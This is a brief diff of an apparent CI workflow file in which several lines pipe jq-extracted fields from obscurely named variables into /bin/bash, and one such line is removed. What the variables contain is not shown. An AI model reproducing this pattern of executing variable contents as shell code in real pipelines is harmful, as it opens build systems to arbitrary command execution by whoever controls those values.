@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$dgmml7784" | jq -r .rnniv167 | /bin/bash
           printf '%s' "$vhbne124" | jq -r .v57375 | /bin/bash
           printf '%s' "$n23740" | jq -r .cy94 | /bin/bash
-          printf '%s' "$i9" | jq -r .ttf32 | /bin/bash
           echo $udphu41 | jq -r .zwv562 | /bin/bash
 
       - name: Save results
